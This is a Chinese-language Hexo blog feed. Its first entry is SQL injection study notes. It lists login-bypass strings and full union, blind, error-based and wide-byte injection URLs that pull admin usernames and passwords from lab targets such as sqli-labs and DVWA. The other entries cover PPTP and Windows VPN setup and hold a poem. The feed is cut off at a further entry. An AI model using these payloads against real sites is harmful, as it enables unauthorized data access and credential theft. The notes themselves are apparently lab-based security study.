<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cancrie&#39;s blog.</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-22T13:36:34.543Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Cancrie</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sql注入小结</title>
    <link href="http://yoursite.com/2019/04/11/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"/>
    <id>http://yoursite.com/2019/04/11/sql注入小结/</id>
    <published>2019-04-11T13:56:32.000Z</published>
    <updated>2019-07-22T13:36:34.543Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="一-sql注入漏洞"><a href="#一-sql注入漏洞" class="headerlink" title="一.sql注入漏洞"></a>一.sql注入漏洞</h1><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>（1）有一个参数用户可控；</p><p>（2）服务器对该参数没有过滤或者过滤不够严谨；</p><h5 id="本质"><a href="#本质" class="headerlink" title="本质:"></a>本质:</h5><p>把用户输入的数据and1=1当作代码执行，违背了“数据与代码分离”的原则</p><h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h5><p>用户能控制输入的内容</p><p>web应用把用户输入的内容带入到数据库中执行（不过滤或者过滤不严谨）</p><h5 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h5><p>读取数据库的数据</p><p>修改或者删除数据</p><p>getshell </p><p>往服务器读取文件</p><h1 id="二-万能密码"><a href="#二-万能密码" class="headerlink" title="二.万能密码"></a>二.万能密码</h1><p>传入SQL语句可控参数分为两类 </p><ol><li><p>数字类型，参数不用被引号括起来，如?id=1 </p></li><li><p>其他类型，参数要被引号扩起来,如?name=”phone”</p></li></ol><p>常见万能密码：</p><p><code>1&#39; or 1=1#</code></p><p><code>1&#39; or &#39;a&#39;=&#39;a&#39;#</code></p><p><code>admin&#39; or 1=1-- -</code></p><p><code>&quot;or &quot;a&quot;=&quot;a</code><br><code>&#39;)or(&#39;a&#39;=&#39;a</code><br><code>or 1=1--</code><br><code>&#39;or 1=1--</code><br><code>a&#39;or&#39; 1=1--</code><br><code>&quot;or 1=1--</code><br><code>&#39;or&#39;a&#39;=&#39;a</code><br><code>&quot;or&quot;=&quot;a&#39;=&#39;a</code><br><code>&#39;or&#39;&#39;=&#39;</code><br><code>&#39;or&#39;=&#39;or&#39;</code><br><code>1 or &#39;1&#39;=&#39;1&#39;=1</code><br><code>1 or &#39;1&#39;=&#39;1&#39; or 1=1</code></p><h1 id="三-手工注入"><a href="#三-手工注入" class="headerlink" title="三.手工注入"></a>三.手工注入</h1><h5 id="1-常用函数："><a href="#1-常用函数：" class="headerlink" title="1.常用函数："></a>1.常用函数：</h5><p>user()用户    </p><p>version()版本    </p><p>database()数据库 </p><p>concat(str1,str2,…) 没有分隔符地连接字符串 </p><p>concat_ws(separator,str1,str2,…) 含有分隔符地连接字符串 </p><p>group_concat(str1,str2,…)连接一个组的所有字符串，并以逗号分隔每一条数据 </p><p>mid()  适用于mysql  </p><p>substr()  适用于oracle  mysql sqlserver</p><p>substring()  适用于mysql sqlserver</p><p>left()</p><p>right()</p><p>length(字符串) 计算字符串长度</p><p>ascii(s)返回字符串 s 的第一个字符的 ASCII 码。</p><p>@@tmpdir   临时文件夹</p><p>@@datadir  数据库文件所在的位置</p><h5 id="2-数据库中注释："><a href="#2-数据库中注释：" class="headerlink" title="2.数据库中注释："></a>2.<strong>数据库中注释：</strong></h5><p>#(%23)    – +</p><h5 id="3-库名表名字段名"><a href="#3-库名表名字段名" class="headerlink" title="3.库名表名字段名"></a>3.库名表名字段名</h5><p>information_schema 自带，系统库，汇总（其他数据库的库名，表名，字段名）</p><p>columns表中，需要关注该表中三个字段：</p><p>table_schema 其他数据库的库名</p><p>table_name     其他数据库的表名</p><p>column_name 其他数据库中字段名</p><h5 id="4-步骤"><a href="#4-步骤" class="headerlink" title="4.步骤"></a>4.步骤</h5><p>step 1：判断是否有注入（判断从后台数据库中选取的列数，判断哪几列从 前端显示）</p><p>step 2：收集数据库信息（用户名、版本、当前数据库名等等）</p><p>step 3：获取当前数据库下的所有表名</p><p>step 4：获取当前数据库下指定表中字段名</p><p>step 5：获取字段对应的数据</p><p>step 6：破解数据，登录系统，getshell，提权，内网渗透</p><h1 id="四-union联合查询注入"><a href="#四-union联合查询注入" class="headerlink" title="四.union联合查询注入"></a>四.union联合查询注入</h1><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p><p>UNION 内部的 SELECT 语句必须拥有相同数量的列。</p><p>列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的 列的顺序必须相同。 </p><p><strong>SQL UNION 语法</strong> </p><p><code>SELECT column_name(s) FROM table_name1</code></p><p><code>UNION</code></p><p><code>SELECT column_name(s) FROM table_name2</code></p><p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。 </p><p><strong>SQL UNION ALL 语法</strong> </p><p><code>SELECT column_name(s) FROM table_name1</code></p><p><code>UNION ALL</code></p><p><code>SELECT column_name(s) FROM table_name2</code></p><p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 </p><p>Union all 与 union 的区别是增加了去重的功能。</p><p><strong>eg</strong></p><h6 id="1-收集信息："><a href="#1-收集信息：" class="headerlink" title="1.收集信息："></a>1.收集信息：</h6><p>所有数据库</p><p>​    <code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(select group_concat(distinct table_schema)  from information_schema.columns),3,4,5%23</code></p><p>当前数据库</p><p>​    <code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(database()),3,4,5%23</code></p><h6 id="2-获取当前数据库下表名"><a href="#2-获取当前数据库下表名" class="headerlink" title="2.获取当前数据库下表名"></a>2.获取当前数据库下表名</h6><p><code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(select group_concat(distinct table_name)  from information_schema.columns  where table_schema=database()),3,4,5%23</code></p><h6 id="3-获取当前数据库下指定表的字段名"><a href="#3-获取当前数据库下指定表的字段名" class="headerlink" title="3.获取当前数据库下指定表的字段名"></a>3.获取当前数据库下指定表的字段名</h6><p>sql语句：</p><p><code>select group_concat(distinct column_name ) from information_schema.columns where table_schema=database() and table_name=0x6a64795f61646d696e;</code></p><p>注入语句：</p><p><code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(select group_concat(distinct column_name ) from information_schema.columns where table_schema=database() and table_name=0x6a64795f61646d696e),3,4,5%23</code></p><h6 id="4-获取字段数据"><a href="#4-获取字段数据" class="headerlink" title="4.获取字段数据"></a>4.获取字段数据</h6><p><code>http://192.168.10.18/jdy1.5/typeid.php?typeid=-1 UNION ALL SELECT 1,(select concat_ws(0x7e,username,password) from jdy_admin limit 0,1),3,4,5%23</code></p><h1 id="五-盲注"><a href="#五-盲注" class="headerlink" title="五.盲注"></a>五.盲注</h1><p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，用户提交的数据在后台数据库中执行，没有任何数据（报错信息、执行sql的数据）传递到前端。这种类型就是盲注。</p><p>分类：</p><p>1.使用基于布尔的盲注    使用bool–&gt;页面是否显示正常</p><p>2.基于时间的盲注           使用time–&gt;页面加载时间</p><p>利用这些方法并结合浏览器的显示效果判断payload的正确性</p><h4 id="基于布尔的盲注探测"><a href="#基于布尔的盲注探测" class="headerlink" title="基于布尔的盲注探测"></a>基于布尔的盲注探测</h4><p><strong>step 1：探测注入点</strong>，’     / 1’ an 1=1 #   /1 ‘ and ‘1’=1’#</p><p>SELECT * FROM users WHERE id=’1’</p><p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39; and 1=1--+</code></p><p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39; and 1=2--+</code></p><p>注意：用户提交的数据被带入到后台数据库中执行了，根据页面的显示效果判断此处是否有注入点</p><p><strong>step 2：收集数据库信息</strong>（当前用户名，当前数据库……）</p><p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and length(user())=14%23</code></p><p>用户名长度14</p><p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and ascii(substr(user(),1,1))=114%23</code></p><p>用户名第一个字符是r</p><p><strong>step 3：查询当前数据库中的表名</strong></p><p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),1,1)=114 %23</code> </p><p> 0  0-5    1：1-20表长吧 114  33-127</p><p>用burp suite跑，得emails</p><p>找出有价值的数据表users</p><p><strong>step 4：获取指定表的字段名</strong></p><p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and ascii(substr((select distinct column_name from information_schema.columns where table_name=0x7573657273 and table_schema=database() limit 0,1),1,1)=114 %23</code></p><p><strong>step 5：获取字段数据</strong></p><p><code>http://192.168.11.94/sqli-labs-master/Less-8/?id=1&#39;and ascii(substr((select group_concat(username,password) from users limit 0,1),1,1)=114 %23</code></p><p>跑burp</p><h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>函数：</p><p>​    sleep() benchmark() 要与条件类函数配置使用</p><p>​    sleep(参数) 参数直接写以秒为单位的时间数字  sleep(5) </p><p>​    返回值是0</p><p>​    <code>select *  from users where id=1 and select if(1=1,sleep(5),&#39;bye&#39;);</code></p><p>​    benchmark(参数1，参数2) 参数1 表示执行某项操作的次数  参数2 某项操作，函数或者表达式</p><p>​    <code>select if(length(user())&gt;4,benchmark(5000000,md5(&#39;abc&#39;)),&#39;bye&#39;)</code></p><p>实验操作：</p><p>​    <strong>step 1 ：找注入点</strong></p><p>​    <strong>step 2：数据库信息</strong></p><p>​        当前数据库长度：</p><p>​        <code>select *  from users where id=1 and select if(length（database()）=4,sleep(5),&#39;bye&#39;);</code></p><p>​        探测数据库名的每个字符：</p><p>​        <code>select *  from users where id=1 and select if(ascii(subtring(database(),1,1))=107,1,sleep(5));</code></p><p>​        dvwa</p><p>​    <strong>step 3:获取数据库中的表</strong></p><p>​        <code>select *  from users where id=1 and select if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100,1,sleep(5));</code></p><p>​    <strong>step 4:获取字段名</strong></p><p>​        <code>select *  from users where id=1 and select if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39;and  table_schema=database() limit 0,1),1,1)))&gt;100,1,sleep(5));</code></p><p>​    <strong>step 5：获取字段内容</strong></p><p>​        select *  from users where id=1 and select if((ascii(substr(( select password from users limit 0,1),1,1)))=68</p><p>,1,sleep(5));</p><h1 id="六-报错注入"><a href="#六-报错注入" class="headerlink" title="六.报错注入"></a>六.报错注入</h1><p>报错函数：</p><p>（1）extractvalue(参数1,参数2)</p><p>从目标XML中返回查询的字符串，参数1是string格式，XML文档名，参数2是XPATH格式，要查询的字符串</p><p><code>select extractvalue(1,concat(0x7e,(select user()),0x7e));</code></p><p>  (2)updatexml(参数1，参数2，参数3)</p><p>改变文档中符合条件的节点的值，参数1是xml文档，参数2是XPATH的字符串，参数3是string格式，替换，查找符合条件的数据</p><p><code>select updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>（3）floor()函数，必须和count() rand() group by 配合才能报错</p><p><code>select * from news where tid=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p><p>达到相同目的的函数都可以替换去使用</p><p><code>(select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)</code></p><p><code>select count(*),(root@localhost0)x from information_schema.tables group by x</code></p><p><code>select concat(user(),floor(rand(0)*2))x;</code></p><p>floor()返回参数的整数部分</p><p>floor报错本质：</p><p>创建虚拟表格时，执行主键查询两次出错！！</p><p><strong>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</strong></p><p>其他7种报错函数：</p><p>​      （1）geometrycollection（）</p><p><code>select * from news where tid=1 and geometrycollection((select * from (select * from (select user())a)b));</code></p><p>​    (2)multipoint()函数</p><p><code>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</code></p><p>​        (3)polygon()函数</p><p><code>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</code></p><p>​    (4)multipolygon()函数</p><p><code>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</code></p><p>​    (5)linestring()函数</p><p><code>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</code></p><p>​    (6)multilinestring()函数</p><p><code>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</code></p><p>​    (7)exp()函数</p><p><code>select * from test where id=1 and exp(~(select * from(select user())a));</code></p><p>报错本质：有回显（联合、报错）</p><p>实验演示：</p><p><code>select extractvalue(1,concat(0x7e,(select user()),0x7e));</code></p><p><strong>step 1:测试注入点</strong></p><p><strong>step 2：获取数据库信息（当前数据库）</strong></p><p><code>select extractvalue(1,concat(0x7e,(select database()),0x7e));</code></p><p><code>http://192.168.10.18/SQLI_LAB/Less-5/?id=1&#39; and  extractvalue(1,concat(0x7e,(database()),0x7e))--+</code></p><p><strong>step 3:表名</strong></p><p><code>and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))#</code></p><p><code>http://127.0.0.1/sqli-labs-master/Less-5/?id=1 &#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e))--+</code></p><p><strong>step 4：字段名</strong></p><p><code>http://127.0.0.1/sqli-labs-master/Less-5/?id=1 &#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;user&#39; and table_schema=database() limit 2,1),0x7e))--+</code></p><p><strong>step 5:字段内容</strong></p><p><code>http://127.0.0.1/sqli-labs-master/Less-5/?id=1 &#39; and extractvalue(1,concat(0x7e,(select concat(username,&#39;|&#39;,password) from users limit 0,1),0x7e))--+</code></p><h1 id="七-宽字节注入"><a href="#七-宽字节注入" class="headerlink" title="七.宽字节注入"></a>七.宽字节注入</h1><p>常见的转义函数：</p><p>​    <code>addslaches()</code></p><p>​    <code>mysql_real_escape_string()</code></p><p>​    <code>mysql_escape_string()</code>   <strong>注意：php5.3以及之后就废除</strong></p><p>​    魔数引号GPC模块  magic_quotes_gpc</p><p>​    对特殊字符进行转义 ‘    “  \   NULL等</p><p>​                     \’  \”  \  \</p><p>mysql_real_escape_string() 不会对%  和 _转义 </p><p>gbk编码：GB2312的一个扩展，使用两个字节编码一个汉字 8140-FEFE</p><p>漏洞原因：</p><p>​    数据库采用GBK编码</p><p>​    对用户输入的数据进行转义</p><p><code>http://127.0.0.1/kuanzijie?id=&#39;1%df&#39;&#39;</code></p><p><code>http://127.0.0.1/kuanzijie?id=&#39;1%df\&#39;&#39;</code></p><p><code>http://127.0.0.1/kuanzijie?id=1%df%5c&#39;</code></p><p><code>http://127.0.0.1/kuanzijie?id=&#39;1運&#39;&#39;</code></p><p>PDO宽字节</p><p>1.数据库使用GBK编码</p><p>2.使用转义函数，如addslaches()</p><p>3.PHP版本&lt;5.3.6 使用PDO连接数据库，设置编码方式GBK，没有参数过滤，存在SQL注入</p><p>宽字节的防御：（代码层防御）</p><p>对宽字节编码的最好的修补方法：</p><p>（1）使用mysql_Set_charset(GBK)</p><p>（2）使用mysql_real_escape_string()转义参数</p><h1 id="八-二次解码注入"><a href="#八-二次解码注入" class="headerlink" title="八.二次解码注入"></a>八.二次解码注入</h1><p> PHP中常用过滤函数如</p><p>addslashes()、mysql_real_escape_string()、mysql_escape_string()</p><p>或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\）和NULL等特殊字符前面加上反斜杠来进行转义。</p><p>但是这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。</p><p>urldecode()函数是对已编码的URL进行解码。</p><p>引发注入的原因其实很简单，PHP本身在处理提交的数据之前会进行一次解码，</p><p>例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；</p><p>然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’，单引号引发了注入。rawurldecode()也会产生同样的问题</p><h1 id="九-二次注入"><a href="#九-二次注入" class="headerlink" title="九.二次注入"></a>九.二次注入</h1><p>是指已存储的数据（脏数据）在被读取后再次进入到SQL查询语句中导致的注入</p><p>原理：</p><p>第一次在进行数据库插入数据的时候，仅仅使用addslashes()或者魔数引号GPC,对其中的特殊数据进行转义，存在入数据的时候保留其原来的格式，也即还是脏数据。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，取来这些脏数据放在sql语句中去查询，这样就会造成SQL的二次注入</p><h1 id="十-HTTP头部注入"><a href="#十-HTTP头部注入" class="headerlink" title="十.HTTP头部注入"></a>十.HTTP头部注入</h1><p>cookie注入</p><p>$_POST[]</p><p>$_GET[]</p><p>$_REQUEST[]</p><p>post和get方式被过滤，只能通过cookie方式注入</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;一-sql注入漏洞&quot;&gt;&lt;a href=&quot;#一-sql注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;一.sql注入漏洞&quot;&gt;&lt;/a&gt;一.sql注入漏洞&lt;/h1&gt;&lt;h5 id=&quot;原理：&quot;&gt;&lt;a href=&quot;#原理：&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu_create_vpn服务器</title>
    <link href="http://yoursite.com/2019/04/06/ubuntu-create-vpn%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://yoursite.com/2019/04/06/ubuntu-create-vpn服务器/</id>
    <published>2019-04-06T07:39:38.000Z</published>
    <updated>2019-07-22T13:36:45.273Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>在Ubuntu上搭建VPN方法很多，常见的三种方法分别是PPTP,L2TP/IPsec，OpenVPN。其中PPTP是配置最简单的方式，本次配置使用PPTP方式。</p><h1 id="1-安装pptpd"><a href="#1-安装pptpd" class="headerlink" title="1.安装pptpd"></a>1.安装pptpd</h1><p>在Ubuntu服务上建立pptp server，需要安装包pptpd，用apt-get方式安装。</p><p><code>sudo apt-get install pptpd</code></p><h1 id="2-配置文件-etc-pptpd-conf"><a href="#2-配置文件-etc-pptpd-conf" class="headerlink" title="2.配置文件/etc/pptpd.conf"></a>2.配置文件/etc/pptpd.conf</h1><p><code>sudo vi /etc/pptpd.conf</code></p><p>在文件末尾找到localip和remoteio两个参数，去掉注释并修改。localip是VPN连通后服务器的ip地址，remoteip是客户端可以分配的地址</p><p><code>localip 192.168.0.1</code></p><p><code>remoteip 192.168.0.234-238,192.168.0.245</code></p><h1 id="3-配置文件-etc-ppp-pptp-options"><a href="#3-配置文件-etc-ppp-pptp-options" class="headerlink" title="3.配置文件/etc/ppp/pptp-options"></a>3.配置文件/etc/ppp/pptp-options</h1><p><code>sudo vi /etc/ppp/pptp-options</code></p><p>修改ms-dns选项，为 VPN 客户端指派 DNS 服务器地址：</p><p><img src="/2019/04/06/ubuntu-create-vpn服务器/1.png" alt="示例图片" title="例"> </p><h1 id="4-设置vpn账户"><a href="#4-设置vpn账户" class="headerlink" title="4.设置vpn账户"></a>4.设置vpn账户</h1><p>修改/etc/ppp/chap-secrets文件，存放VPN的用户名和密码，根据实际情况填写即可。第一列是用户名，第二列是服务器名，第三列是密码，第四列是IP限制</p><p><code>sudo vi /etc/ppp/chap-secrets</code></p><p><img src="/2019/04/06/ubuntu-create-vpn服务器/2.png" alt="示例图片" title="例"> </p><p>此时连接VPN的客户端除了访问该服务器的资源外，其余内外和互联网的内容均无法访问。</p><h1 id="5-开启内核IP转发"><a href="#5-开启内核IP转发" class="headerlink" title="5.开启内核IP转发"></a>5.开启内核IP转发</h1><p><code>sudo vi etc/sysctl.conf</code></p><p>取消net.ipv4.ip_forward=1这一行的注释，再执行</p><p><code>sudo sysctl -p</code></p><p>使配置文件生效</p><p><img src="/2019/04/06/ubuntu-create-vpn服务器/3.png" alt="示例图片" title="例">    </p><h1 id="6-安装iptables，实现请求的NAT转发"><a href="#6-安装iptables，实现请求的NAT转发" class="headerlink" title="6.安装iptables，实现请求的NAT转发"></a>6.安装iptables，实现请求的NAT转发</h1><h5 id="1-安装iptables"><a href="#1-安装iptables" class="headerlink" title="1.安装iptables"></a>1.安装iptables</h5><p><code>sudo apt-get install iptables</code></p><h5 id="2-允许gre协议以及1723、47端口"><a href="#2-允许gre协议以及1723、47端口" class="headerlink" title="2.允许gre协议以及1723、47端口"></a>2.允许gre协议以及1723、47端口</h5><p><code>sudo iptables -A INPUT -p gre -j ACCEPT</code></p><p><code>sudo iptables -A INPUT -p tcp --dport 1723 -j ACCEPT</code> </p><p><code>sudo iptables -A INPUT -p tcp --dport 47 -j ACCEPT</code></p><h5 id="3-开启NAT转发"><a href="#3-开启NAT转发" class="headerlink" title="3.开启NAT转发"></a>3.开启NAT转发</h5><p><code>sudo iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o ens33 -j MASQUERADE</code></p><h5 id="4-保存"><a href="#4-保存" class="headerlink" title="4.保存"></a>4.保存</h5><p>Iptables的规则会在下次重启时被清除，把它保存下来，用iptables-save命令：</p><p> <code>sudo iptables-save &gt; /etc/iptables-rules</code></p><h5 id="5-修改配置"><a href="#5-修改配置" class="headerlink" title="5.修改配置"></a>5.修改配置</h5><p>修改/etc/network/interfaces文件，在末尾添加</p><p> <code>pre-up iptables-restore &lt;/etc/iptables-rules</code></p><p>这样当网卡ens33被加载时就会自动载入我们预先用iptables-save保存的设置。</p><h1 id="7-收工"><a href="#7-收工" class="headerlink" title="7.收工"></a>7.收工</h1><p>重启pptpd服务，搭建完成，在其他虚拟机上实验一下。</p><p><img src="/2019/04/06/ubuntu-create-vpn服务器/4.png" alt="示例图片" title="例"></p><p>可以上网。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;在Ubuntu上搭建VPN方法很多，常见的三种方法分别是PPTP,L2TP/IPsec，OpenVPN。其中PPTP是配置最简单的方式，本次配置使用PPTP方式。&lt;/p&gt;
&lt;h1 id=&quot;1-安装pptpd&quot;&gt;&lt;a href=&quot;#1-安装
      
    
    </summary>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>win2008_create_vpn</title>
    <link href="http://yoursite.com/2019/04/02/win2008-create-vpn/"/>
    <id>http://yoursite.com/2019/04/02/win2008-create-vpn/</id>
    <published>2019-04-02T13:44:35.000Z</published>
    <updated>2019-07-22T13:37:04.349Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>1.添加服务器角色：网络策略和访问服务</p><p><img src="/2019/04/02/win2008-create-vpn/1.png" alt="示例图片" title="例"></p><p>2.配置路由与远程访问</p><p><img src="/2019/04/02/win2008-create-vpn/2.png" alt="示例图片" title="例"></p><p>3.右键属性，配置并启动路由与远程访问</p><p><img src="/2019/04/02/win2008-create-vpn/3.png" alt="示例图片" title="例"></p><p>4.自定义</p><p><img src="/2019/04/02/win2008-create-vpn/4.png" alt="示例图片" title="例"></p><p>5.全选</p><p><img src="/2019/04/02/win2008-create-vpn/5.png" alt="示例图片" title="例"></p><p>6.完成添加</p><p><img src="/2019/04/02/win2008-create-vpn/6.png" alt="示例图片" title="例"></p><p>7.配置nat接口，选择ipv4下nat新增接口</p><p><img src="/2019/04/02/win2008-create-vpn/7.png" alt="示例图片" title="例"></p><p>8.右键新建接口，选择本地连接</p><p><img src="/2019/04/02/win2008-create-vpn/8.png" alt="示例图片" title="例"></p><p>9.右击“路由和远程访问”，选择属性，点击IPv4。<img src="/2019/04/02/win2008-create-vpn/9.png" alt="示例图片" title="例"></p><p>10.可选择静态地址池，选择添加IP地址用于分配给连接VPN的用户IP地址。<img src="/2019/04/02/win2008-create-vpn/10.png" alt="示例图片" title="例"></p><p>11.添加一个用户vpn<img src="/2019/04/02/win2008-create-vpn/11.png" alt="示例图片" title="例"></p><p>12.完成win2008上的VPN服务器搭建</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;1.添加服务器角色：网络策略和访问服务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/04/02/win2008-create-vpn/1.png&quot; alt=&quot;示例图片&quot; title=&quot;例&quot;&gt;&lt;/p&gt;
&lt;p&gt;2.配置路由与远程访问&lt;/p&gt;
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2019/03/31/%E8%AF%97%E5%A2%83/"/>
    <id>http://yoursite.com/2019/03/31/诗境/</id>
    <published>2019-03-31T12:50:44.686Z</published>
    <updated>2019-07-22T13:37:14.661Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="诗境"><a href="#诗境" class="headerlink" title="诗境"></a>诗境</h1><p>在一个金色的鱼儿群聚的海岸</p><p>我们把篝火点燃了</p><p>所有的故事都在这个夜晚</p><p>听见了</p><p>年轻的想象为我建筑镜之国</p><p>把我引到月亮身边</p><p>在此曾目睹</p><p>驯养神龙的少年</p><p>而所有的天空都唉声叹气</p><p>融化的雪水</p><p>从母亲手指的缝隙中</p><p>滴在额头</p><p>我想你在海岸线旁使用的语调</p><p>是宇宙中蓝星的季节</p><p>轻轻地夹在日记的一叶</p><p>善于遗忘的色彩</p><p>为此采撷鳞翅的昆虫</p><p>你如此轻柔抚摸它们的触角</p><p>是月亮女神</p><p>永睡的恩底弥翁的吻</p><p>温暖的太阳初映照山泉的时候</p><p>就可以停下摇铃</p><p>和唱诵</p><p>夜莺在睡梦中暗暗啜泣</p><p>如果在那栈桥上你还要挽留</p><p>我唱起天使曾唱的歌</p><p>你把我拥抱</p><p>徙游的鸥燕怎么能明白</p><p>黑色中柔弱枯萎的一朵</p><p>与我仔细用意一把折断的雨伞</p><p>收拾在宝箱里</p><p>时间那好似艳羡口吻的情书</p><p>那是出于惊喜而赠送的一朵</p><p>与绵绵的白雪</p><p>一起翻身上马</p><p>带有青春的肃杀与冷痛</p><p>绝情的缔造者真是迟钝</p><p>凡是在高原上居住的神灵都显得</p><p>空洞而自哀</p><p>在祭典火红的灯光下</p><p>实现残忍的决心</p><p>在于为苍白的纸卷书画颜色</p><p>因此我只有一杆琴</p><p>山河万物也不尽然舞蹈</p><p>在森林中睡着了</p><p>像是个怀念妻子的老人</p><p>你永远不能相信我关于七彩的魔法</p><p>只要夜晚永不落幕</p><p>所以老虎收藏我的骸骨</p><p>那珍贵的羽翼一双</p><p>出于可爱的目的</p><p>没有人再会打扰这次的梦境</p><p>只要我再歌唱起神话</p><p>那自天穹滚滚而降的训谕</p><p>又会在废墟之中塔的影轮的影</p><p>重生</p><p>请给我我的爱人请不要走</p><p>你占我诗一行</p><p>无论是海波还是天空</p><p>都能飘过</p><p>就这样追寻着温柔的香味</p><p>我等待着你的发现</p><p>在这颗星球的中心我像树一样生长</p><p>飞行思索连接</p><p>牵上我的手呀</p><p>带我穿越那个绝望的春天</p><p>在无尽欢喜之池中逐渐窒息</p><p>正如山海中火把游行</p><p>香折冷梅一枝</p><p>我把诗记在月亮的殿堂</p><p>你们会拿着蜡烛来祭奠</p><p>每一滴火焰都窃窃私语</p><p>在银河的中央</p><p>最后睁开黑色的瞳眸</p><p>最后停下爱的想象</p><p>拥抱着这个宇宙全部的辉耀</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;诗境&quot;&gt;&lt;a href=&quot;#诗境&quot; class=&quot;headerlink&quot; title=&quot;诗境&quot;&gt;&lt;/a&gt;诗境&lt;/h1&gt;&lt;p&gt;在一个金色的鱼儿群聚的海岸&lt;/p&gt;
&lt;p&gt;我们把篝火点燃了&lt;/p&gt;
&lt;p&gt;所有的故事都在这个夜晚&lt;/p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>webkali</title>
    <link href="http://yoursite.com/2019/03/22/webkali/"/>
    <id>http://yoursite.com/2019/03/22/webkali/</id>
    <published>2019-03-22T01:09:09.000Z</published>
    <updated>2019-07-22T13:36:55.775Z</updated>
    
